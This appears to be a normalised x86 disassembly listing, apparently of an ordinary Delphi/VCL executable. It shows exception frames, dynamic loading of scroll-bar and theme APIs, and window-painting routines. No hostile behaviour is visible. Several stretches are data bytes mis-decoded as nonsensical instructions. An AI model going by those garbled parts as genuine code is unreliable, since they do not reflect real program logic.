mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42ab80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ac73
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac7a
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x10 ]
call sub_405874
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_40588c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42ac98
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42ad77
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40405c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad7e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a84
lea eax [ ebp - 0x8 ]
call sub_405874
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_429454
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40588c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4058b8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ad98
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4058e8
xor eax eax
push ebp
push sub_42ade7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40588c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42adee
lea eax [ ebx + 0xc ]
call sub_405874
sub_42adf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_42ae89
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42ab80
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae90
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_42a694
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42a6c4
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42a864
sub_42aeb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_429454
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_429454
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418200
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_429454
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418200
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418200
sub_42af40
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_42a654
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403290
mov eax [ esi + 0x14 ]
call sub_403290
mov eax [ esi + 0x10 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405874
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42af94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42afcb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42afd2
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42afdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b001
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b008
retn
sub_42b014
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b045
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b04c
retn
mov eax [ rw-data ]
call sub_403290
sub_42b058
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42b08c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42b0b4
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42b336
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b35d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b364
retn
sub_42b378
les esi [ ebx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42b425
mov ah 0x42
add [ esp + esi * 4 - 0x4b37ffbe ] bh
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
sub_42b44c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42b48c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42b4e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b509
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b510
retn
sub_42b51c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42b4d4
xor eax eax
push ebp
push sub_42b6d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6da
mov eax [ rw-data ]
call sub_42b4dc
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42b6dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42b4d4
xor eax eax
push ebp
push sub_42ba8f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba96
mov eax [ rw-data ]
call sub_42b4dc
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42be40
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42be68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42beb0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42beb7
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403290
call sub_42b51c
cmp [ rw-data ] 0x0
jg r-xdata
sub_42bed8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42befd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf04
retn
sub_42bfbd
rol [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
rol [ edx ] 0xde
rol [ edx ] 0xc
add al [ eax ]
add al al
dec ebx
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x3eebffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax + 0x40042c1 ] bh
add [ ebx + 0x3b008500 ] al
mov al 0x10
mov al 0xa8
retn 0x42
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
sub_42c06e
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax + 0x40042c1 ] bh
add [ ebx + 0x3b008500 ] al
mov al 0x10
mov al 0xa8
retn 0x42
sub_42c114
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b008
mov al [ r-xdata ]
mov [ esi + 0x208 ] al
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x20a ] 0x2
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_42c165
add [ eax ] al
add [ ebx + 0x51 ] dl
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x208 ] al
mov eax ebx
call sub_44c87c
sub_42c1b8
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
lea edi [ esp + 0x10 ]
push esp
mov eax ebx
call sub_44f2dc
push eax
call GetClientRect
push edi
mov eax ebx
call sub_44f2dc
push eax
call GetWindowRect
push 0x2
push edi
mov eax ebx
call sub_44f2dc
push eax
push 0x0
call MapWindowPoints
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
push esi
call ExcludeClipRect
mov eax [ edi + 0x4 ]
neg eax
push eax
mov eax [ edi ]
neg eax
push eax
push edi
call OffsetRect
xor eax eax
mov al [ ebx + 0x208 ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x209 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
push eax
push edi
push esi
call DrawEdge
mov eax [ edi + 0xc ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
push esi
call IntersectClipRect
mov eax [ ebx + 0x170 ]
call sub_423fe8
push eax
push edi
push esi
call FillRect
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_42c2a8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov esi [ edi + 0x8 ]
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov ebp esi
push ebp
call InflateRect
xor eax eax
cmp [ ebx + 0x209 ] 0x0
je r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
inc eax
mov esi ebp
test [ ebx + 0x208 ] 0x1
je r-xdata
inc eax
test [ ebx + 0x208 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x208 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x208 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
mov edx edi
mov eax ebx
call sub_4500a4
pop ebp
pop edi
pop esi
pop ebx
retn
sub [ esi + 0xc ] eax
sub_42c324
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42c37a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c381
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
sub_42c3c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42c3ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c3f4
retn
sub_42c400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c425
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c42c
retn
sub_42c438
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c45d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c464
retn
sub_42c470
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c495
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c49c
retn
sub_42c4a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c4cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4d4
retn
sub_42c4e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c505
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c50c
retn
sub_42c520
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c545
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c54c
retn
sub_42c558
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c57d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c584
retn
sub_42c594
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 ] bl
inc edx
add [ esi + eax * 8 ] bh
inc edx
add [ eax ] bl
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ eax + 0x280042ca ] bl
xor al [ eax ]
inc esp
xor al [ eax ]
cmp al 0xca
inc edx
add al dh
mov [ ecx ] eax
